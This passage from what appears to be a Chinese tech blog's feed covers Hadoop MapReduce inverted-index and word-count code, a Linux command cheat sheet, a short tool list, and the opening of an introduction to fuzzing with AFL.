<h2 id="combine函数及其实现"><a href="#combine函数及其实现" class="headerlink" title="combine函数及其实现"></a>combine函数及其实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static class Combine extends Reducer&lt;Text, Text, Text, Text&gt; &#123;</span><br><span class="line">        private Text info = new Text();</span><br><span class="line">        // 实现reduce函数， 将相同key值的value加起来</span><br><span class="line">        // 并将(单词:文件名, value) 转换为 （单词， 文件名:value）</span><br><span class="line">        @Override</span><br><span class="line">        public void reduce(Text key, Iterable&lt;Text&gt; values, Context context) throws IOException, InterruptedException &#123;</span><br><span class="line">            // 统计词频</span><br><span class="line">            int sum = 0;</span><br><span class="line">            for (Text val : values)&#123;</span><br><span class="line">                sum += Integer.parseInt(val.toString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 重新设置value值由URL和词频组成</span><br><span class="line">            String[] splitValue = key.toString().split(&quot;:&quot;);</span><br><span class="line">            String newValue = splitValue[1]+&quot;:&quot;+ String.valueOf(sum);</span><br><span class="line">            info.set(newValue);</span><br><span class="line">            // 重新设置key值为单词</span><br><span class="line">            key.set(splitValue[0]);</span><br><span class="line">            context.write(key, info);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>统计词频，并且将(key,value)转换。</p>
<h2 id="reduce-函数及其实现"><a href="#reduce-函数及其实现" class="headerlink" title="reduce 函数及其实现"></a>reduce 函数及其实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static class Reduce extends Reducer&lt;Text, Text, Text, Text&gt; &#123;</span><br><span class="line">        private Text result = new Text();</span><br><span class="line">        // 实现reduce函数, 将相同单词的value聚合成一个总的value，每个value之间用`;`隔开, 最后以`;`结尾</span><br><span class="line">        @Override</span><br><span class="line">        public void reduce(Text key, Iterable&lt;Text&gt; values, Context context) throws IOException, InterruptedException &#123;</span><br><span class="line">            String item= &quot;&quot;;</span><br><span class="line">            for(Text value : values)&#123;</span><br><span class="line">                item = item + value.toString()+ &quot;;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            result.set(item.trim());</span><br><span class="line">            context.write(key, result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="main方法及其配置"><a href="#main方法及其配置" class="headerlink" title="main方法及其配置"></a>main方法及其配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 第一个参数为 输入文件目录路径， 第二个参数为输出结果路径</span><br><span class="line">        Configuration conf = new Configuration();</span><br><span class="line">        conf.set(&quot;fs.defaultFS&quot;, &quot;hdfs://localhost:9000&quot;);</span><br><span class="line">        conf.set(&quot;fs.hdfs.impl&quot;, &quot;org.apache.hadoop.hdfs.DistributedFileSystem&quot;);</span><br><span class="line"></span><br><span class="line">       /* if (args.length != 2) &#123;</span><br><span class="line">            System.err.println(&quot;Usage: Inverted Index &lt;in&gt; &lt;out&gt;&quot;);</span><br><span class="line">            System.exit(2);</span><br><span class="line">        &#125;*/</span><br><span class="line"></span><br><span class="line">        Job job = new Job(conf, &quot;Inverted Index&quot;);</span><br><span class="line">        job.setJarByClass(InvertIndex_origin.class);</span><br><span class="line"></span><br><span class="line">        // 设置Map、Combine和Reduce处理类</span><br><span class="line">        job.setMapperClass(Map.class);</span><br><span class="line">        job.setCombinerClass(Combine.class);</span><br><span class="line">        job.setReducerClass(Reduce.class);</span><br><span class="line"></span><br><span class="line">        // 设置Map输出类型</span><br><span class="line">        job.setMapOutputKeyClass(Text.class);</span><br><span class="line">        job.setMapOutputValueClass(Text.class);</span><br><span class="line"></span><br><span class="line">        // 设置Reduce输出类型</span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(Text.class);</span><br><span class="line"></span><br><span class="line">        // 设置输入和输出目录</span><br><span class="line">        String input_path = &quot;/input&quot;;</span><br><span class="line">        String out_path = &quot;/output&quot;;</span><br><span class="line">        FileInputFormat.addInputPath(job, new Path(input_path));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, new Path(out_path));</span><br><span class="line">        System.exit(job.waitForCompletion(true) ? 0 : 1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>bigdata</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>hadoop02-wordCount</title>
    <url>/2020/01/07/hadoop02-wordCount/</url>
    <content><![CDATA[<p>hadoop的一个应用实例：词频统计及其理论介绍</p>
<a id="more"></a>
<h1 id="0x00-实例代码"><a href="#0x00-实例代码" class="headerlink" title="0x00 实例代码"></a>0x00 实例代码</h1><p>一个简单介绍MapReduce技术的<a href="https://edu.aliyun.com/lesson_1802_15663?spm=5176.10731542.0.0.824e244b8wdsOb#_15663" target="_blank" rel="noopener">文档</a><br>见官网提供的词频统计示例：<a href="https://hadoop.apache.org/docs/r2.7.2/hadoop-mapreduce-client/hadoop-mapreduce-client-core/MapReduceTutorial.html" target="_blank" rel="noopener">官网词频统计</a></p>
<h2 id="一个测试用例"><a href="#一个测试用例" class="headerlink" title="一个测试用例"></a>一个测试用例</h2><p>test.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Bye GoogBye Hadoop Hello Word Hadoop Word</span><br></pre></td></tr></table></figure>

<h2 id="首先实现一个Mapper类"><a href="#首先实现一个Mapper类" class="headerlink" title="首先实现一个Mapper类"></a>首先实现一个Mapper类</h2><p>具体需要导入的包见官方示例。这里用到的都是hadoop中重新定义的类型，保证能序列化和反序列化。<br>对应如下：</p>
<blockquote>
<p>Long === LongWritable<br>String === Text<br>Integer === IntWritable</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static class TokenizerMapper</span><br><span class="line">       extends Mapper&lt;Object, Text, Text, IntWritable&gt;&#123;</span><br><span class="line"></span><br><span class="line">    private final static IntWritable one = new IntWritable(1);</span><br><span class="line">    private Text word = new Text();</span><br><span class="line"></span><br><span class="line">    public void map(Object key, Text value, Context context</span><br><span class="line">                    ) throws IOException, InterruptedException &#123;</span><br><span class="line">      StringTokenizer itr = new StringTokenizer(value.toString());</span><br><span class="line">      while (itr.hasMoreTokens()) &#123;</span><br><span class="line">        word.set(itr.nextToken());</span><br><span class="line">        context.write(word, one);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>该方法定义的输入是<code>&lt;Object, Text&gt;</code>，输出是<code>&lt;Text, IntWritable&gt;</code>。StringTokenizer是<code>java.util</code>包下分割字符串工具。通过write方法将结果输出到文件中去。<br>该map输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt; Bye, 1&gt;</span><br><span class="line">&lt; GoodBye, 1&gt;</span><br><span class="line">&lt;Hadoop, (1,1)&gt;</span><br><span class="line">&lt; Hello, 1&gt;</span><br><span class="line">&lt; World, (1,1)&gt;</span><br></pre></td></tr></table></figure>

<p>如果设置了combiner操作<code>job.setCombinerClass(IntSumReducer.class)</code>，则会进行合并操作。<strong>每次运行完map，会对输出按照key进行排序，把输出传递给本地combiner，进行本地聚合。</strong><br>可以见到，词频统计的combiner和reduce操作是一样的流程。combiner（按照配置可以知道和reduce一样），<br>经过combiner后，map输出如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt; Bye, 1&gt;</span><br><span class="line">&lt; GoodBye, 1&gt;</span><br><span class="line">&lt;Hadoop, 2&gt;</span><br><span class="line">&lt; Hello, 1&gt;</span><br><span class="line">&lt; World, 2&gt;</span><br></pre></td></tr></table></figure>

<h2 id="实现一个Reduce类"><a href="#实现一个Reduce类" class="headerlink" title="实现一个Reduce类"></a>实现一个Reduce类</h2><p>经过map和combiner后，reduce收到的数据是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Bye, [1]&gt;</span><br><span class="line">&lt;GoodBye, [1]&gt;</span><br><span class="line">&lt;Hadoop, [1,1]&gt;</span><br><span class="line">&lt;hello, [1]&gt;</span><br><span class="line">&lt;World, [1]&gt;</span><br></pre></td></tr></table></figure>

<p>之后进行reduce操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static class IntSumReducer</span><br><span class="line">      extends Reducer&lt;Text,IntWritable,Text,IntWritable&gt; &#123;</span><br><span class="line">   private IntWritable result = new IntWritable();</span><br><span class="line"></span><br><span class="line">   public void reduce(Text key, Iterable&lt;IntWritable&gt; values,</span><br><span class="line">                      Context context</span><br><span class="line">                      ) throws IOException, InterruptedException &#123;</span><br><span class="line">     int sum = 0;</span><br><span class="line">     for (IntWritable val : values) &#123;</span><br><span class="line">       sum += val.get();</span><br><span class="line">     &#125;</span><br><span class="line">     result.set(sum);</span><br><span class="line">     context.write(key, result);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>将相同key的值进行操作，对不同map的输出进行汇总。</p>
<h2 id="编写main方法"><a href="#编写main方法" class="headerlink" title="编写main方法"></a>编写main方法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">   Configuration conf = new Configuration();</span><br><span class="line">   Job job = Job.getInstance(conf, &quot;word count&quot;);</span><br><span class="line">   job.setJarByClass(WordCount.class);</span><br><span class="line">   job.setMapperClass(TokenizerMapper.class);</span><br><span class="line">   job.setCombinerClass(IntSumReducer.class);</span><br><span class="line">   job.setReducerClass(IntSumReducer.class);</span><br><span class="line">   job.setOutputKeyClass(Text.class);</span><br><span class="line">   job.setOutputValueClass(IntWritable.class);</span><br><span class="line">   FileInputFormat.addInputPath(job, new Path(args[0]));</span><br><span class="line">   FileOutputFormat.setOutputPath(job, new Path(args[1]));</span><br><span class="line">   System.exit(job.waitForCompletion(true) ? 0 : 1);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>这个方法使设置job的一些配置，主要涉及map类，reduce类。输出的key, value类型。设置作业的输入，输出路径。<br>要想程序能跟运行，还需要连接hdfs系统。有两种方法，把core.xml放到资源文件下，或加入如下的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conf.set(&quot;fs.defaultFS&quot;, &quot;hdfs://localhost:9000&quot;);</span><br><span class="line">conf.set(&quot;fs.hdfs.impl&quot;, &quot;org.apache.hadoop.hdfs.DistributedFileSystem&quot;);</span><br></pre></td></tr></table></figure>

<h1 id="0x01-一些问题"><a href="#0x01-一些问题" class="headerlink" title="0x01 一些问题"></a>0x01 一些问题</h1><p>Q1:为什么不用JAVA的序列化？<br>A1：java序列化是一个重量级框架(Serializable)，一个对象序列化后有许多额外的信息如校验信息，Header，继承体系)。不便在网络中高效传输，所以Hadoop开发了自己的序列化机制(Writable)。</p>
<p>Q2: mapreduce有哪些进程<br>A2: 有三类实例进程：</p>
<blockquote>
<ul>
<li>MrAppMaster: 负责过程调度及状态协调</li>
<li>MapTask: 负责Map阶段的数据处理流程</li>
<li>ReduceTask: 负责Reduce阶段的整个数据处理流程，对每一组相同的&lt;k,v&gt;调用一次reduce方法。</li>
</ul>
</blockquote>
<h1 id="0x02-mapReduce框架原理"><a href="#0x02-mapReduce框架原理" class="headerlink" title="0x02 mapReduce框架原理"></a>0x02 mapReduce框架原理</h1><h2 id="InputFormat数据输入"><a href="#InputFormat数据输入" class="headerlink" title="InputFormat数据输入"></a>InputFormat数据输入</h2><p>数据块：Block是HDFS在物理上把数据分成一块一块。<br>数据切片：在逻辑上对输入进行分片。<br>一个Job的map阶段并行度由客户端在提交Job时的切片数决定，每一个Split切片分配一个MapTask实例。切片是针对每一个文件单独切片。</p>
<h1 id="0x03-mapReduce开发过程"><a href="#0x03-mapReduce开发过程" class="headerlink" title="0x03 mapReduce开发过程"></a>0x03 mapReduce开发过程</h1><h2 id="1-输入数据接口：InputFormat"><a href="#1-输入数据接口：InputFormat" class="headerlink" title="1. 输入数据接口：InputFormat"></a>1. 输入数据接口：InputFormat</h2><ul>
<li>默认使用实现类是<code>TextInputFormat</code>：一次读一行文本，然后将该行的起始字节偏移量作为key，行内容(不包括换行和回车)作为value值返回。</li>
<li><code>KeyValueTextInputFormat</code>每一行均为一条记录，被分割符分割为key，value。默认分隔符是tab(‘\t’)。</li>
<li><code>NlineInputFormat</code>按照指定的行数N来划分切片，每一个切片对应一个MapTask。</li>
<li><code>CombineTextInputFormat</code>把多个小文件合并成一个切片处理，提高处理效率。</li>
<li>用户可以自定义<code>InputFormat</code>。</li>
</ul>
<h2 id="2-逻辑处理接口-Mapper"><a href="#2-逻辑处理接口-Mapper" class="headerlink" title="2. 逻辑处理接口:Mapper"></a>2. 逻辑处理接口:Mapper</h2><p>用户根据业务需求有选择的实现三个方法：<code>map()</code>，<code>setup()</code>，<code>cleanup()</code></p>
<h2 id="3-Partitioner分区"><a href="#3-Partitioner分区" class="headerlink" title="3. Partitioner分区"></a>3. Partitioner分区</h2><ul>
<li>有默认实现<code>HashPartitioner</code>，根据key的哈希值和numReduces返回一个分区号。用户无法控制哪个key存储到那个分区。</li>
<li>也可以自定义分区。</li>
</ul>
<h2 id="4-Comparable排序"><a href="#4-Comparable排序" class="headerlink" title="4. Comparable排序"></a>4. Comparable排序</h2><p>用自定义对象作为key来输出是，就必须实现WritableComparable接口，重写其中的compareTo()方法。<br>部分排序：对最终输出的每一个文件进行内部排序。<br>全排序：对所有数据进行排序，通常只有一个Reduce。<br>二次排序：排序条件有两个。</p>
<h2 id="5-Combiner合并"><a href="#5-Combiner合并" class="headerlink" title="5. Combiner合并"></a>5. Combiner合并</h2><p>提高执行效率，减少IO开销</p>
<h2 id="6-Reduce端分组：GroupingComparator"><a href="#6-Reduce端分组：GroupingComparator" class="headerlink" title="6.Reduce端分组：GroupingComparator"></a>6.Reduce端分组：GroupingComparator</h2><p>在Reduce端进行key分组。应用于接受key为对象时，想让一个或几个字段相同的key进入同一个reduce方法。</p>
<h2 id="7-逻辑处理接口"><a href="#7-逻辑处理接口" class="headerlink" title="7.逻辑处理接口"></a>7.逻辑处理接口</h2><p>根据业务需求实现三个方法：<code>reduce()</code>, <code>setup()</code>, <code>cleanup()</code>。</p>
<h2 id="8-数据输出接口"><a href="#8-数据输出接口" class="headerlink" title="8.数据输出接口"></a>8.数据输出接口</h2><ul>
<li>默认实现是<code>TextOutputFormat</code>，将每一个kv对，向目标文件中输出一行。</li>
<li><code>SequenceFileOutputFormat</code>输出作为后续MapReduce任务的输入。</li>
<li>可以自定义<code>OutputFormat</code></li>
</ul>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://edu.aliyun.com/lesson_1802_15663?spm=5176.10731542.0.0.824e244b8wdsOb#_15663" target="_blank" rel="noopener">https://edu.aliyun.com/lesson_1802_15663?spm=5176.10731542.0.0.824e244b8wdsOb#_15663</a></p>
]]></content>
      <categories>
        <category>bigdata</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-basic</title>
    <url>/2019/12/07/linux-basic/</url>
    <content><![CDATA[<p>Linux入门<br>学习linux的一些基本操作</p>
<a id="more"></a>
<p>更改主机名<br><code>hostname</code>查看主机名<br><code>hostname Name</code>临时更改<br><code>vim /etc/hostname</code>永久修改<br>查看系统版本<code>cat /etc/issue</code></p>
<h1 id="0x00-文件操作"><a href="#0x00-文件操作" class="headerlink" title="0x00 文件操作"></a>0x00 文件操作</h1><h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h2><p>功能：用于目录或者文件的复制<br>格式：<code>cp [options] file destination</code><br>举例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp a.txt b.txt    重新创建新的时间戳</span><br><span class="line">cp -p a.txt b.txt 不改变时间戳，所属用户</span><br><span class="line">cp -r a b         递归复制，用于文件夹</span><br></pre></td></tr></table></figure>

<h2 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h2><p>功能：移动和重命名文件或者目录<br>格式：<code>mv [option] src des</code><br>举例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv a ab 重命名</span><br><span class="line">mv a ../ 移动a到上层目录</span><br></pre></td></tr></table></figure>

<h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h2><p><code>rm -rf filename</code></p>
<h1 id="0x01系统管理"><a href="#0x01系统管理" class="headerlink" title="0x01系统管理"></a>0x01系统管理</h1><h2 id="监控系统状态"><a href="#监控系统状态" class="headerlink" title="监控系统状态"></a>监控系统状态</h2><h3 id="w命令"><a href="#w命令" class="headerlink" title="w命令"></a>w命令</h3><p>功能：查看系统当前负载<br>时间，系统运行时间，登陆用户数，平均负载。<br>这里特别要注意评价负载中的第一个值：表示1分钟内的系统评价负载(单位时间内使用CPU的活动进程数)。如果小于CPU的数量就OK，否则系统有压力。</p>
<blockquote>
<p>查看CPU的个数/核: <code>cat /proc/cpuinfo</code></p>
</blockquote>
<h3 id="vmstat"><a href="#vmstat" class="headerlink" title="vmstat"></a>vmstat</h3><p>功能：监控系统状态<br>用法：不加参数不会刷新，加参数会刷新<code>vmstat 1</code>(1秒刷新一次)，或者<code>vmstat 1 5</code>刷新五次<br>解释：</p>
<ul>
<li>r:运行或者等待CPU时间片的进程数，等待非CPU资源的进程数。</li>
<li>swpd:切换到变换分区的内存数量(KB)，free:空闲内存数(KB)，buff:将写入磁盘缓冲大小的数(KB)，cache:磁盘读取的缓冲大小(KB)</li>
<li>si:变换区写入内存的大小(KB，)，so:内存写入变换区的数量，<strong>值大说明内存不够</strong></li>
<li>bi:从块设备中读取的数据量KB，bo:写入块设备的数据量。</li>
<li>in:某一个时间间隔观测到的每秒设备中断次数，cs:每秒产生上下文切换次数</li>
<li>us:用户所花费CPU时间百分比，sy：系统花费CPU时间百分比，id：cpu处于空闲时间段的百分比，wa：IO等待所占用CPU百分比，st：被偷走的CPU所占百分比。</li>
</ul>
<h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>功能：显示进程所占系统资源，3s变换一次<br>占用系统资源（CPU，内存，磁盘）最高进程放前面<br><code>top -bn1</code>非动态打印使用情况。</p>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>功能：查看内存使用情况<br><code>free -h</code></p>
<h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>查看系统所有进程<br><code>ps aux</code>和<code>ps au</code><br>暴力删掉进程：<code>kill -9 PID</code><br>进程状态：D:不能中断的进程，R:正在运行的进程，S：已经中断的进程，s:主进程，T:已经停止暂停的进程，z:僵尸进程，&lt;：高优先级进程，l:多线程进程，+：前台运行的进程</p>
<h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>功能：查看网络连接状况，系统开发端口，路由表等信息</p>
<blockquote>
<p><code>-r</code>查看路由表(netstat -r)</p>
</blockquote>
<p><code>netstat -lnp</code>该命令表示系统启用的端口<br><code>netstat -lnp | head -n30</code><br>上面一部分监听TCP/IP，下面监听Socket(unix开头)<br><code>netstat -an</code> 查看网络连接状况<br>如<code>netstat -an | grep 80</code>可以查看web服务器连接的IP</p>
<h2 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h2><h3 id="查看磁盘"><a href="#查看磁盘" class="headerlink" title="查看磁盘"></a>查看磁盘</h3><p><code>df -h</code>或者<code>df -h | grep -v tmpfs</code></p>
<h3 id="查看文件或者目录"><a href="#查看文件或者目录" class="headerlink" title="查看文件或者目录"></a>查看文件或者目录</h3><p><code>du -sh filename</code></p>
<h1 id="0x02文本编辑"><a href="#0x02文本编辑" class="headerlink" title="0x02文本编辑"></a>0x02文本编辑</h1><p>这里介绍的是vi或则vim编辑器，涉及到命令模式，编辑模式</p>
<h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><p><code>vim test.txt</code> 打开文件定位到第一行行首<br><code>vim test.txt +6</code>打开文件并且定位于第6行<br><code>vim test.txt +</code> 打开文件并且定位于最后一行<br><code>vim test.txt +/pattern</code> 打开文件并且定位到第一次匹配到pattern的行首</p>
<h2 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h2><p><code>h</code>左，<code>l</code>右，<code>k</code>上，<code>j</code>下<br><code>ctrl+B</code>向前翻一页，<code>ctrl+F</code>向后翻一页，<code>gg</code>首行，<code>G</code>行尾，<code>nG</code>任意行(n为数字)<br><code>shift+6</code>本行行首，<code>shift+4</code>本行行尾</p>
<h2 id="进入编辑模式"><a href="#进入编辑模式" class="headerlink" title="进入编辑模式"></a>进入编辑模式</h2><p><code>i</code>向前插入，<code>a</code>向后插入，<code>I</code>行首插入，<code>A</code>行尾插入，<code>o</code>下一行插入，<code>O</code>上一行插入</p>
<h2 id="文本操作"><a href="#文本操作" class="headerlink" title="文本操作"></a>文本操作</h2><p><code>x</code>向后删除一个字符，<code>X</code>向前删除一个字符，<code>nx</code>向后删除n个字符<br><code>dd</code>剪切光标所在行，<code>ndd</code>向后剪切n行<br><code>yy</code>复制光标所在行，<code>nyy</code>向后复制n行<br><code>p</code>向光标所在行下复制，<code>P</code>向上复制<br><code>u</code>还原上一步操作，<code>v</code>选定字符</p>
<h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><p><code>:set nu</code>显示行号，<code>:w</code>保存，<code>:w!</code>强制保存，<code>:wq</code>保存并推出，<code>:q!</code>强退，改动不生效，<code>:set nonu</code>不显示行号，<code>:!cmd</code>执行shell命令<br><code>:set paste</code>粘贴<br><code>/word</code>向光标后查询word，n向后搜索<br><code>?word</code>向光标前查询word，n向前搜索<br><code>:n1,n2s/word1/word2/g</code>n1和n2行之间查询word1并替换为word2，不加g只替换每行第一个<br><code>:1,$s/word1/word2/g</code>全文查询word1并替换为word2，不加g只替换每行第一个</p>
<h1 id="0x03压缩与打包"><a href="#0x03压缩与打包" class="headerlink" title="0x03压缩与打包"></a>0x03压缩与打包</h1><p>一些格式：<br><code>.gz</code>使用gzip压缩的文件，<code>.bz2</code>使用bizp2压缩的文件，<code>.tar</code>使用tar打包的文件或者目录，无压缩功能<br><code>.tar.gz</code>先tar打包，再gzip压缩，<code>.tar.bz2</code>先tar打包，再bzip2压缩，<code>.tar.xz</code>先tar打包，再xz压缩</p>
<h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><p>格式： <code>tar [-zjxcvfpP] filename</code><br>参数说明：<br><code>-z</code>:打包同时使用gzip压缩，<code>-j</code>:同时使用bzip2压缩，<code>-J</code>:同时使用xz压缩<br><code>-x</code>:解包或者解压，<code>-c</code>建立一个tar包或者压缩包<br><code>-v</code>可视化，，<code>-t</code>查看文件，<code>-f</code>操作的文件<br>举例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -cvf a.tar a 将文件或目录a打包成a.tar</span><br><span class="line">tar -czvf a.tar.gz a 将文件或者目录打包并使用gzip压缩</span><br><span class="line">tar -tf a.tar.gz 查看文件列表</span><br><span class="line">tar -zxvf a.tar.gz 解压</span><br></pre></td></tr></table></figure>

<h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>上面列举的三个都不支持压缩目录，该工具支持压缩目录，但是要压缩需要指定目录下的文件<br>压缩：<code>zip test.zip test/*</code><br><code>zip -r test.zip test/</code> 一并压缩二级目录，不需要星号了<br>解压：<code>unzip test.zip</code></p>
<h1 id="0x04软件安装"><a href="#0x04软件安装" class="headerlink" title="0x04软件安装"></a>0x04软件安装</h1><h2 id="ubuntu系统下"><a href="#ubuntu系统下" class="headerlink" title="ubuntu系统下"></a>ubuntu系统下</h2><p>一般使用<code>apt-get</code>。apt-get命令适用于deb包管理式的Linux操作系统（Debian、Ubuntu等），主要用于自动从互联网软件仓库中搜索、下载、安装、升级、卸载软件或操作系统[2]。<br>普通安装<code>apt-get install PackageName</code><br>重新安装<code>apt-get --reinstall install PackageName</code><br>修复依赖关系<code>apt-get -f install</code><br>下载源码<code>apt-get source PackageName</code><br>删除软件包，保留配置文件<code>apt-get remove PackageName</code><br>删除软件包，同时删除配置文件<code>apt-get purge PackageName</code><br>清楚已经下载的软件包和旧安装包<code>apt-get clean &amp;&amp; apt-get autoclean</code><br>更新安装源<code>apt-get update</code><br>列出已经安装的所有软件包<code>dpkg -l</code></p>
<p>安装.deb格式的软件安装包<code>dpkg -i xxxx.deb</code></p>
<h1 id="0x05正则表达式与流式编辑工具"><a href="#0x05正则表达式与流式编辑工具" class="headerlink" title="0x05正则表达式与流式编辑工具"></a>0x05正则表达式与流式编辑工具</h1><h2 id="正则基础"><a href="#正则基础" class="headerlink" title="正则基础"></a>正则基础</h2><p><code>.</code> 匹配任意单个字符<br><code>?</code> 匹配0到1次<br><code>*</code> 匹配0到多次<br><code>+</code> 匹配1到多次<br><code>{n}</code> 匹配n次<br><code>{n,}</code>匹配n到多次；<code>{n,m}</code>匹配n到m次<br><code>.*</code>匹配任意字符<br><code>^</code>行首，<code>$</code>行尾 <code>\&lt;</code>，<code>\&gt;</code>单词首尾边界<br><code>|</code> 连接操作符<br><code>[]</code>字符序列单字符占位</p>
<h2 id="grep-egrep"><a href="#grep-egrep" class="headerlink" title="grep/egrep"></a>grep/egrep</h2><p>功能：流式文本工具，面向行编辑<br>命令格式：<code>grep [-cinvABC] pattern fileName</code><br>说明：<code>-c</code>打印符合要求的行数，<code>-i</code>忽略大小写，<code>-n</code>输出符号要求的行和行号，<code>-v</code>输出不符合要求的行，<code>-A number</code>输出符合要求的行及下两行，<code>-B number</code> 行及上两行，<code>-c number</code>行及上下各两行，<code>-e</code>使用扩展的正则表达式。<br>正则式+是不能再grep中使用的<br>举例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -B 2 &apos;df&apos; test.txt 打印出test.txt中字符串df的行及上两行，也可写成-B2</span><br><span class="line">grep -n &apos;df&apos; test.txt 打印出df所在行及行号</span><br><span class="line">grep -nv &apos;df&apos; test.txt 打印没有df的行及行号</span><br><span class="line">grep &apos;[0-9]&apos; test.txt 过滤出数字行</span><br><span class="line">grep -v &apos;^#&apos; test.txt 过滤掉所有#开头的行</span><br><span class="line">grep -e &apos;[0-9]&#123;4&#125; test.txt 不加-e的话就需要这样写 grep &quot;[0-9]\&#123;4\&#125;&quot; test.txt</span><br><span class="line">grep &quot;&lt;ooxx&gt;&quot; test.txt 选出包含单词ooxx的行</span><br></pre></td></tr></table></figure>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="http://www.apelearn.com/study_v2/" target="_blank" rel="noopener">http://www.apelearn.com/study_v2/</a><br>[2] <a href="https://blog.csdn.net/xietansheng/article/details/80044644" target="_blank" rel="noopener">https://blog.csdn.net/xietansheng/article/details/80044644</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>software-intro</title>
    <url>/2019/12/04/software-intro/</url>
    <content><![CDATA[<p>software library</p>
<a id="more"></a>
<h1 id="代码阅读"><a href="#代码阅读" class="headerlink" title="代码阅读"></a>代码阅读</h1><h2 id="Understand"><a href="#Understand" class="headerlink" title="Understand"></a>Understand</h2><p>以直观地看到项目结构和规模，灰框代表一个文件夹，蓝色方块代表了一个文件，其大小和颜色分别反映了行数和文件复杂度。</p>
<h1 id="终端神器"><a href="#终端神器" class="headerlink" title="终端神器"></a>终端神器</h1><h2 id="MobaXterm"><a href="#MobaXterm" class="headerlink" title="MobaXterm"></a>MobaXterm</h2><p>一个全能的终端神器，shell, vnc, sftp等功能。</p>
]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>software</tag>
      </tags>
  </entry>
  <entry>
    <title>fuzzing-basic</title>
    <url>/2019/12/04/fuzzing-basic/</url>
    <content><![CDATA[<p>fuzzing介绍与afl安装</p>
<a id="more"></a>

<h1 id="0x00-fuzzing简单介绍"><a href="#0x00-fuzzing简单介绍" class="headerlink" title="0x00 fuzzing简单介绍"></a>0x00 fuzzing简单介绍</h1><p>fuzzing：一种通过向程序提供<strong>非预期的输入</strong>并监控输出中的<strong>异常</strong>来发现软件中的<strong>故障</strong>的方法。<br>一般代指模糊测试，一种基于黑盒的测试技术。所谓模糊，是指测试用例是模糊的，不确定的，随机性的。Fuzzing技术本质是依靠随机函数生成<strong>随机测试用例</strong>来进行测试验证，所以是不确定的。</p>
<h2 id="测试用例的产生方式"><a href="#测试用例的产生方式" class="headerlink" title="测试用例的产生方式"></a>测试用例的产生方式</h2><ul>
<li>基于变异：根据已知数据样本通过变异的方法生成新的测试用例。</li>
<li>基于生成：根据已知的协议或接口规范进行建模，生成测试用例。</li>
</ul>
<h1 id="0x01-AFL"><a href="#0x01-AFL" class="headerlink" title="0x01 AFL"></a>0x01 AFL</h1><p>一个基于变异的fuzzer。American Fuzzy Lop简称AFL。</p>
<h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>一个强大的Fuzzing测试工具，在源码编译时进行插桩(简称编译时插桩)，可以自动产生测试用例来探索二进制程序内部新的执行路径。</p>
<blockquote>
<p>插桩技术是将额外的代码注入程序中以收集运行时的信息；可以分为两类，</p>
<ul>
<li>源代码插桩(Source Code Instrumentation(SCI))：额外代码注入到程序源代码中。</li>
<li>二进制插桩(Binary Instrumentation(BI))：额外代码注入到二进制可执行文件中。</li>
</ul>
</blockquote>
